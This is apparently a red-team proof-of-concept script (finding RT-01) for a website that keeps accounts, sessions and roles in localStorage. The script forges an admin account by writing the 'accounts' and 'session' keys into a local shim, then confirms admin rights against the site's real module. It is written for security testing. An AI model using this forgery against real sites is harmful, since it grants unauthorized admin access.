// Finding RT-01: the site has no server-side account system. Every account, the session and the role live in
// localStorage (site/js/storage/accounts.js). A visitor who can run JavaScript on the page (their own browser
// console, a bookmarklet, or any other XSS) can write a `role: "admin"` account directly into localStorage and
// become an admin instantly, without ever knowing the developer/admin unlock code or its SHA-256 hash.
// This script reproduces the forgery against the real module, with a minimal in-memory localStorage shim
// (no browser is started: Web Crypto's SubtleCrypto is used from Node, the rest of the page is irrelevant).
// Safe: runs only in this process, touches no network, no real site, no real user.
//
// Run: node security/redteam/01-localstorage-admin-forge.mjs
import { webcrypto } from 'node:crypto';
import { currentUser, isUnlimited } from '../../site/js/storage/accounts.js';

const store = new Map();
const storage = {
  get: (key, fallback) => (store.has(key) ? JSON.parse(store.get(key)) : fallback),
  set: (key, value) => {
    store.set(key, JSON.stringify(value));
    return true;
  },
  remove: (key) => store.delete(key),
};

console.log('=== RT-01: forging an admin account by writing localStorage directly ===');

// The attacker never registers, never learns the role-unlock code. They just write the two keys the
// storage module trusts blindly: `accounts` (the account list) and `session` (which id is "signed in").
const forgedId = 'u_attacker_0000';
storage.set('accounts', [
  {
    id: forgedId,
    name: 'Forged Admin',
    email: 'attacker@forged.invalid',
    salt: '00'.repeat(16),
    hash: '00'.repeat(32), // never checked again once the session points at this id
    iterations: 100000,
    role: 'admin', // <-- the whole point: no code, no hash check, just this string
  },
]);
storage.set('session', { userId: forgedId });

const user = currentUser(storage, { crypto: webcrypto });
console.log('currentUser() after the forged write:', user);

const ok = user?.role === 'admin' && isUnlimited(user);
console.log(
  ok ? 'CONFIRMED: attacker is now role=admin with no daily diagram limit, no code used.' : 'NOT confirmed (unexpected result, re-check the module).',
);
process.exit(ok ? 0 : 1);
